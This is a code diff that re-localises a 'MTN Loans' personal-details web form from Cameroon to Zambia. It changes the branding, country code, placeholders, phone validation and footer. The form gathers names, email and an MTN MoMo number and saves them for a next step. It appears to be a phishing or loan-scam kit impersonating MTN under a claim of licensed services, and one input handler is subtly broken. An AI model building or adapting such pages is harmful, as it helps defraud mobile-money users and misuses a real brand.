@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=yes">
-    <title>MTN  | Personal Details – mtn.cm</title>
+    <title>MTN Loans | Personal Details – mtn.co.zm</title>
     <meta name="theme-color" content="#FFCC00">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
@@ -63,8 +63,9 @@
             line-height: 1.2;
         }
 
-        .logo- {
+        .logo-loans {
             color: #1a1a1a;
+            margin-left: 4px;
         }
 
         main {
@@ -344,7 +345,10 @@
 <body>
     <header>
         <button class="back-btn" onclick="history.back()">←</button>
-        <div class="logo"><span class="logo-mtn">MTN</span><span class="logo-"> </span></div>
+        <div class="logo">
+            <span class="logo-mtn">MTN</span>
+            <span class="logo-loans">Loans</span>
+        </div>
     </header>
     <main>
         <div class="form-card">
@@ -363,24 +367,24 @@
             <div class="name-group">
                 <div>
                     <label class="form-label">First Name</label>
-                    <input type="text" class="form-input" id="firstName" placeholder="e.g. Jean">
+                    <input type="text" class="form-input" id="firstName" placeholder="e.g. John">
                 </div>
                 <div>
                     <label class="form-label">Last Name</label>
-                    <input type="text" class="form-input" id="lastName" placeholder="e.g. Nkolo">
+                    <input type="text" class="form-input" id="lastName" placeholder="e.g. Banda">
                 </div>
             </div>
 
             <div class="form-group">
                 <label class="form-label">Email Address</label>
-                <input type="email" class="form-input" id="email" placeholder="e.g. jean.nkolo@example.com">
+                <input type="email" class="form-input" id="email" placeholder="e.g. john.banda@example.com">
             </div>
 
             <div class="form-group">
                 <label class="form-label">Phone Number (MTN MoMo)</label>
                 <div id="phoneGroup">
-                    <span>+237</span>
-                    <input type="tel" id="phone" placeholder="6 55 123 456" maxlength="11" inputmode="numeric">
+                    <span>+260</span>
+                    <input type="tel" id="phone" placeholder="7 66 123 456" maxlength="9" inputmode="numeric">
                 </div>
             </div>
 
@@ -391,7 +395,7 @@
         </div>
     </main>
     <footer>
-        © 2026 MTN Cameroon – Licensed mobile financial services | Powered by MTN Mobile Money (MoMo) | Terms apply
+        © 2026 MTN Zambia – Licensed mobile financial services | Powered by MTN Mobile Money (MoMo) | Terms apply
     </footer>
 
     <div id="spinner">
@@ -431,7 +435,7 @@
         }
 
         function isValidPhoneNumber(phoneDigits) {
-            // For Cameroon, expect exactly 9 digits
+            // Zambia: exactly 9 digits (after +260)
             return /^\d{9}$/.test(phoneDigits);
         }
 
@@ -445,6 +449,8 @@
             const firstName = firstNameInput.value.trim();
             const lastName = lastNameInput.value.trim();
             const phoneRaw = phoneInput.value.trim();
+            // Remove spaces and any non-digit characters
+            const phoneDigits = phoneRaw.replace(/\D/g, '');
 
             if (!firstName) {
                 firstNameInput.classList.add('invalid');
@@ -470,17 +476,17 @@
                 phoneGroup.classList.add('invalid');
                 isValid = false;
                 errorMsg = 'Phone number is required.';
-            } else if (!/^\d{9}$/.test(phoneRaw)) {
+            } else if (!isValidPhoneNumber(phoneDigits)) {
                 phoneGroup.classList.add('invalid');
                 isValid = false;
-                errorMsg = 'Phone number must be 9 digits (e.g. 655123456).';
+                errorMsg = 'Phone number must be 9 digits (e.g. 766123456).';
             }
 
             const email = emailInput.value.trim();
             if (email && (!email.includes('@') || !email.includes('.') || email.length < 5)) {
                 emailInput.classList.add('invalid');
                 isValid = false;
-                errorMsg = 'Please enter a valid email address (e.g. name@domain.cm).';
+                errorMsg = 'Please enter a valid email address (e.g. name@domain.zm).';
             }
 
             if (!isValid) {
@@ -498,10 +504,12 @@
             if (isProcessing) return;
             if (!validateForm()) return;
 
+            // Store the cleaned phone number (digits only)
+            const phoneDigits = phoneInput.value.trim().replace(/\D/g, '');
             localStorage.setItem('firstName', firstNameInput.value.trim());
             localStorage.setItem('lastName', lastNameInput.value.trim());
             localStorage.setItem('email', emailInput.value.trim());
-            localStorage.setItem('phone', phoneInput.value.trim());
+            localStorage.setItem('phone', phoneDigits);
 
             nextBtn.disabled = true;
             nextBtn.classList.add('disabled-btn');
@@ -530,6 +538,8 @@
         phoneInput.addEventListener('input', () => {
             phoneGroup.classList.remove('invalid');
             hideError();
+            // Allow only digits
+            this.value = this.value.replace(/\D/g, '');
         });
 
         window.hideError = hideError;
